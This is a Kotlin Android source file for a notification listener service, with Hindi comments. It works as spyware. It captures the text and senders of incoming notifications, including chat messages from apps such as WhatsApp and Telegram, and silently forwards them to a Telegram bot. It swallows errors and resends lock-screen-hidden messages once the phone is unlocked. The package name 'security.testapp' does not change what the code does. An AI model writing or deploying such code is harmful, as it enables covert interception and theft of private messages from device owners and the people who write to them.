package com.security.testapp

import android.app.Notification
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import java.util.Collections
import java.util.LinkedHashSet

class NotificationListener : NotificationListenerService() {

    companion object {
        var instance: NotificationListener? = null
            private set
    }

    private val hiddenKeys = Collections.synchronizedSet(LinkedHashSet<String>())

    override fun onCreate() {
        super.onCreate()
        instance = this
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return

        try {
            val packageName = sbn.packageName
            val notification = sbn.notification

            // 1. MessagingStyle से सारे मैसेज निकालें (WhatsApp, Telegram, आदि)
            val messages = extractMessagesFromNotification(notification)

            // 2. मैसेज बनाएँ
            val finalMessage = if (messages.isNotEmpty()) {
                messages.joinToString("\n") { msg ->
                    val sender = msg.sender?.toString() ?: "Unknown"
                    val text = msg.text?.toString() ?: ""
                    "👤 $sender: $text"
                }
            } else {
                // अगर MessagingStyle नहीं है तो पुराने तरीके से टेक्स्ट निकालें
                val extras = if (notification.visibility == Notification.VISIBILITY_PRIVATE && notification.publicVersion != null) {
                    notification.publicVersion.extras
                } else {
                    notification.extras
                }

                val title = extras?.getString("android.title") ?: ""
                val text = extras?.getCharSequence("android.text")?.toString() ?: ""
                val bigText = extras?.getCharSequence("android.bigText")?.toString() ?: ""
                val lines = extras?.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
                var finalText = if (lines != null && lines.isNotEmpty()) {
                    lines.joinToString("\n")
                } else if (bigText.isNotEmpty()) bigText else text

                if (finalText.isEmpty()) {
                    finalText = extras?.getCharSequence("android.subText")?.toString() ?: ""
                }
                if (finalText.isEmpty()) {
                    finalText = notification.tickerText?.toString() ?: ""
                }

                if (finalText.isEmpty()) {
                    hiddenKeys.add(sbn.key)
                    return
                }

                "📝 Title: $title\n💬 Text: <code>$finalText</code>"
            }

            val msg = "<b>🔔 Notification</b>\n<b>📦 App:</b> $packageName\n$finalMessage"
            TelegramHelper.sendWithFallback(msg, this, "HTML")

        } catch (e: Exception) {
            // silent
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        if (sbn != null) hiddenKeys.remove(sbn.key)
    }

    /** Notification से MessagingStyle के messages निकालें (WhatsApp, आदि के लिए) */
    private fun extractMessagesFromNotification(notification: Notification): List<Notification.MessagingStyle.Message> {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val messagingStyle = Notification.MessagingStyle.extractMessagingStyleFromNotification(notification)
            return messagingStyle?.messages ?: emptyList()
        }
        return emptyList()
    }

    fun onUnlock() {
        val active = activeNotifications ?: return
        for (sbn in active) {
            if (hiddenKeys.remove(sbn.key)) {
                try {
                    val notification = sbn.notification
                    val messages = extractMessagesFromNotification(notification)
                    val finalMessage = if (messages.isNotEmpty()) {
                        messages.joinToString("\n") { msg ->
                            "👤 ${msg.sender}: ${msg.text}"
                        }
                    } else "[Content Hidden]"
                    val msg = "<b>🔓 Unlocked Notification</b>\n<b>📦 App:</b> ${sbn.packageName}\n$finalMessage"
                    TelegramHelper.sendWithFallback(msg, this, "HTML")
                } catch (_: Exception) {}
            }
        }
    }
}
